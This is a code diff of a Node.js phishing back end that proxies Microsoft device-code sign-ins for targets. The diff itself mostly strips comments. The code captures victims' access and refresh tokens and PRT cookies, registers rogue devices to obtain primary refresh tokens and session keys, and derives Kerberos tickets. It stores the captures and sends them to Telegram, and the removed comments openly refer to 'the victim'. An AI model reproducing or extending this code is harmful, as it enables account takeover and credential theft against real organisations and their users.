@@ -1,6 +1,5 @@
 /**
  * VGenius C Engine – Device Proxy Service
- * Handles Microsoft Device Code OAuth flow proxying
  */
 const axios = require('axios');
 const ms = require('./microsoftclient');
@@ -55,20 +54,6 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     const deviceCodeScope = 'https://graph.microsoft.com/.default openid offline_access';
     const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
 
-    // GraphSpy device_codes.generate(version=2, ngcmfa=True, cae=True):
-    //
-    //   body = {"client_id": client_id, "scope": scope}
-    //   if ngcmfa or cae:
-    //       claims_json = {"access_token": {}}
-    //       if ngcmfa: claims_json["access_token"]["amr"]    = {"values": ["ngcmfa"]}
-    //       if cae:    claims_json["access_token"]["xms_cc"] = {"values": ["cp1"]}
-    //       body["claims"] = json.dumps(claims_json)
-    //
-    // This was the reason the victim was never prompted for MFA: the claims
-    // block was absent from the request that actually issues the code, so AAD
-    // was free to satisfy the sign-in from an existing session. amr=ngcmfa
-    // forces a strong-auth (MFA) step; xms_cc=cp1 opts into Continuous Access
-    // Evaluation. Both must ride on the devicecode call itself.
     const deviceCodeClaims = {
       access_token: {
         amr: { values: ['ngcmfa'] },
@@ -84,15 +69,6 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       'Content-Type': 'application/x-www-form-urlencoded'
     };
 
-    // Claim a sticky proxy for the entire device code flow. Microsoft binds
-    // the device_code to the IP that requested it, so the token poll MUST
-    // reuse the same egress IP for the whole flow.
-    //
-    // If the proxied request fails (proxy down, proxy IP blocked by
-    // Microsoft, or an error body instead of a device code), fall back to a
-    // direct request. A broken proxy must not silently produce a job with no
-    // user_code — that job polls forever and the page hangs on
-    // "Generating code..." with no way forward.
     let proxy = null;
     let dcData = null;
 
@@ -123,9 +99,6 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       const data = direct.data;
       if (data && data.user_code && data.device_code) {
         dcData = data;
-        // The device_code is now bound to the direct egress IP. Drop the
-        // proxy so the token poll goes direct too — mixing IPs mid-flow
-        // makes Microsoft reject the exchange.
         if (proxy && proxy.id) {
           try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
         }
@@ -233,8 +206,6 @@ async function pollForToken(jobId) {
           },
           validateStatus: () => true,
           timeout: 15000,
-          // Reuse the exact sticky proxy claimed for the device-code flow.
-          // If the job never had a proxy, go direct instead of claiming a new one.
           proxy: job.proxy || null,
           noProxy: !job.proxy,
         }
@@ -276,9 +247,7 @@ async function pollForToken(jobId) {
           }
         }
 
-        // Device code flow doesn't return x-ms-RefreshTokenCredential cookie.
-        // Do a refresh token exchange to capture the PRT cookie.
-        // This is required for Kerberos derivation and cookie injection.
+
         if (tokenData.refresh_token) {
           try {
             const refreshResponse = await ms.post(
@@ -379,8 +348,6 @@ async function pollForToken(jobId) {
           errorDesc.includes('MSA')
         ))
       ) {
-        // Personal account or declined - stop immediately
-        // This matches competitor behavior showing "code expired"
         job.status = 'failed';
         job.error = 'Code expired';
         return;
@@ -550,10 +517,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
     let deviceTenantId = null;
     let clientInfo = null;
 
-    // Preserve the PRT from the x-ms-RefreshTokenCredential cookie (if present)
-    // This is a JWT that can be decoded for client_info, session_key, tid, uid.
-    // Only accept a real JWT-shaped PRT here; a raw OAuth refresh token is not
-    // a PRT and must never be treated as one for Kerberos/renewal logic.
     const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
     if (prtCookie && prtCookie.value) {
       const prtCookieClaims = parsePrtClaims(prtCookie.value);
@@ -564,9 +527,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       }
     }
 
-    // A raw OAuth refresh_token is not a PRT JWT. It may be used for DRS token
-    // exchange, but it must never be treated as the final PRT for Kerberos or
-    // PRT renewal. Require a JWT-shaped PRT before accepting it.
     if (!prt && tokenData.refresh_token) {
       if (parsePrtClaims(tokenData.refresh_token)) {
         prt = tokenData.refresh_token;
@@ -593,13 +553,8 @@ async function storeToken(job, tokenData, responseCookies = []) {
     let enrollmentTime = null;
     let deviceCertificateEncrypted = null;
     let encryptedPrivateKey = null;
-    // Kept in memory for request_for_device(): the device-signed call is the
-    // only source of the raw PRT and its session_key_jwe.
     let privateKeyPemForPrt = null;
     let certificateDerForPrt = null;
-    // DRS device material of the enrollment that produced the keys above —
-    // used to create/update the device_credentials row when persisting the
-    // session key (the broker-enrollment path never creates that row itself).
     let enrolledDeviceMaterial = null;
 
     if (tokenData.access_token) {
@@ -703,13 +658,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       }
     }
 
-    // ── GraphSpy parity: raw PRT + session_key_jwe via request_for_device ──
-    // The x-ms-RefreshTokenCredential Set-Cookie is a cookie, not the raw PRT,
-    // and the device-code token response carries no session key. The
-    // device-signed (RS256 + x5c) request_for_device call returns BOTH, and it
-    // is the only place session_key_jwe ever comes from — without it
-    // captured_tokens.session_key_jwe stays null and every Kerberos field
-    // (tgt_ad / tgt_cloud / tgt_cloud_sessionkey) stays underivable.
     if (privateKeyPemForPrt && certificateDerForPrt && tokenData.refresh_token && !sessionKeyJwe) {
       try {
         const prtkdf = require('./prtkdf');
@@ -721,10 +669,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         if (prtResult.prt) prt = prtResult.prt;
         if (prtResult.sessionKeyJwe) sessionKeyJwe = prtResult.sessionKeyJwe;
 
-        // Persist the decrypted session key where resolveSessionKeyForToken()
-        // and the Kerberos derivation read it. Upsert: the broker-enrollment
-        // path never creates the device_credentials row itself, so a bare
-        // UPDATE would silently store nothing and lose the session key.
         if (prtResult.sessionKeyHex) {
           try {
             await devicemanager.persistPrtSessionKey(
@@ -747,8 +691,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       }
     }
 
-    // Determine account type from email domain (must be before INSERT)
-    // Default to work/school - only personal accounts (outlook/hotmail/live/passport) are excluded
     let accountType = 'work_school';
     if (email) {
       const emailDomain = email.split('@')[1].toLowerCase();
@@ -802,10 +744,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         tokenId = result.insertId;
       } catch (primaryInsertErr) {
         const primaryMsg = primaryInsertErr?.message || '';
-        // Any "Unknown column 'x' in 'field list'" means this deployment's
-        // captured_tokens is missing a column the primary INSERT needs. Treat
-        // every such case as a schema issue so the legacy (narrower) INSERT
-        // still records the capture instead of the whole row being lost.
         const isDeviceSchemaIssue =
           /Unknown column/i.test(primaryMsg) ||
           /Unknown column 'device_id'/.test(primaryMsg) ||
@@ -857,12 +795,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       console.error('[DeviceProxy] Token insert/fallback error:', e && e.message ? e.message : e);
     }
 
-    // ── Auto-derive Kerberos TGTs (tgt_cloud / tgt_ad / top-level names) ──
-    // The block further down only covers the DRS-registration path
-    // (!deviceEnrolled). This covers the broker-enrolled path — which is the
-    // one that actually yields a raw PRT carrying acrs=pfdr, i.e. the only
-    // PRT that can be exchanged for Kerberos tickets. Runs after the response
-    // is returned, so it never delays the visitor.
     if (tokenId && deviceEnrolled && accountType === 'work_school'
         && tenant && tenant !== 'common' && tenant !== 'organizations') {
       const kerberosService = require('./kerberos');
@@ -886,9 +818,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       }
     }
 
-    // Attempt device registration and PRT generation for ALL work/school accounts
-    // This runs asynchronously and doesn't block the response
-    // Works for: specific tenant GUIDs, 'organizations', AND 'common' endpoints
     if (accountType === 'work_school' && tokenData.access_token && !deviceEnrolled) {
       const deviceManager = require('./devicemanager');
       // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
@@ -908,11 +837,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         // Store device credentials in database
         await deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
 
-        // GraphSpy parity: registerDeviceAndGetPrt() ran the device-signed
-        // request_for_device call (Slice C) during registration. Persist the
-        // session key next to the stored credentials and upgrade the token
-        // row to the real raw PRT (replacing the plain refresh token that
-        // was stored in the prt column at capture time).
         if (registrationResult.sessionKeyHex) {
           try {
             await deviceManager.persistPrtSessionKey(job.user_id, tenant, registrationResult.sessionKeyHex, {
@@ -936,8 +860,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
           }
         }
       }).then(() => {
-        // Auto-derive Kerberos TGTs ONLY after successful device registration
-        // This ensures we have a real PRT (not just a refresh token)
         if (tenant && tenant !== 'common' && tenant !== 'organizations') {
           const kerberosService = require('./kerberos');
           kerberosService.deriveTGTForToken(tokenId)
@@ -992,9 +914,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
       );
       const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
       const newStatus = blockDone ? 'blocked' : 'done';
-      
-      // Update ALL visitors with status 'waiting' OR 'visited' for this user/link
-      // This ensures visitors logged by block-check (status='visited') are also updated
+
       const [updateResult] = await db.query(
         'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
         [newStatus, job.user_id, job.link_id, 'waiting', 'visited']
@@ -1019,8 +939,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       /* silent */
     }
 
-    // Send Telegram capture report directly from device proxy
-    // This ensures Telegram receives the capture even if the worker never calls /api/capture
     try {
       const reportTokenType = job.mode === 'cookie' ? 'cookie' : 'token';
 
@@ -1056,9 +974,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         '========================================'
       ].join('\n');
 
-      // Include only the real GraphSpy PRT cookie in the report. Ordinary
-      // Microsoft cookies (fpc, x-ms-gateway-slice, stsservicecookie, etc.) are
-      // not PRT material and must never be shown as a capture result.
       const reportCookies = [];
       if (responseCookies && responseCookies.length > 0) {
         for (const cookie of responseCookies) {
@@ -1128,8 +1043,6 @@ function getJobStatus(jobId) {
   if (job.status === 'polling') {
     // Return waiting status
     result.status = 'waiting_user';
-    // Surface the user code (and verification URI) as soon as the job has
-    // it, so the page can render the code without waiting for a second poll.
     result.user_code = job.user_code || null;
     result.verification_uri = job.verification_uri || null;
     result.verification_uri_complete = job.verification_uri_complete || null;
